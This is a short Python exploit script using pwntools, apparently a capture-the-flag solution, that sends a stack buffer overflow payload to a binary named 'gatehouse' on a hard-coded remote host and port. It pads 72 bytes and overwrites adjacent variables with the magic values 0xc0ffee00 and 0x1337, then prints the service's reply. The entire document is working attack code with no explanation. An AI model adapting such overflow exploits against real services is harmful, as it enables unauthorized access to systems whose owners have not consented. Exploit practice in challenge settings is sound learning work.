from pwn import *

HOST = "95.216.124.220"
PORT = 30593
BINARY = "./gatehouse"

context.arch = "amd64"
context.log_level = "info"

e = ELF(BINARY, checksec=False)


OFFSET_VAR2 = 72
OFFSET_VAR1 = 76

payload  = b"A" * OFFSET_VAR2
payload += p32(0xc0ffee00)
payload += p32(0x1337)

log.info(f"Payload ({len(payload)} bytes): {payload.hex()}")

io = remote(HOST, PORT)

io.recvuntil(b"Enter credential string: ")
io.send(payload)

output = io.recvall(timeout=3)
print()
print(output.decode(errors='replace'))
